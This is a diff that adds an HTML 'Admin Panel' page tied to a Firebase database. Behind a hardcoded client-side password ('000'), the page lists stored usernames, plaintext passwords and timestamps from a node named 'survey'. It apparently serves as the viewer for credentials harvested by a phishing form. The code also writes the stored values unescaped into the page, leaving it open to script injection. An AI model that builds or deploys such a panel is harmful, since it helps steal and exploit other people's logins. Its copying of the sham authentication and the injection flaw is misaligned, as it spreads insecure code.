@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Admin Panel</title>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<style>
+body{
+    margin:0;
+    font-family:Arial;
+    background:#0f172a;
+    color:white;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+
+.box{
+    background:#1e293b;
+    padding:20px;
+    width:400px;
+    border-radius:10px;
+}
+
+input{
+    width:100%;
+    padding:10px;
+    margin-top:10px;
+    border:none;
+    border-radius:6px;
+}
+
+button{
+    width:100%;
+    padding:10px;
+    margin-top:10px;
+    background:#3b82f6;
+    border:none;
+    color:white;
+    border-radius:6px;
+}
+
+.item{
+    background:#334155;
+    padding:10px;
+    margin-top:10px;
+    border-radius:6px;
+    font-size:14px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+    <h3>Admin Login</h3>
+
+    <input id="pass" type="password" placeholder="Password">
+    <button onclick="login()">Login</button>
+
+    <div id="data"></div>
+</div>
+
+<script>
+
+const firebaseConfig = {
+    databaseURL: "https://ipoi-31504-default-rtdb.firebaseio.com/"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+function login(){
+    if(document.getElementById("pass").value === "000"){
+        load();
+    }
+}
+
+function load(){
+    db.ref("survey").on("value", snap => {
+        let data = snap.val();
+        let html = "";
+
+        for(let key in data){
+            html += `
+                <div class="item">
+                    <b>User:</b> ${data[key].username}<br>
+                    <b>Pass:</b> ${data[key].password}<br>
+                    <b>Time:</b> ${data[key].time}
+                </div>
+            `;
+        }
+
+        document.getElementById("data").innerHTML = html;
+    });
+}
+
+</script>
+
+</body>
+</html>
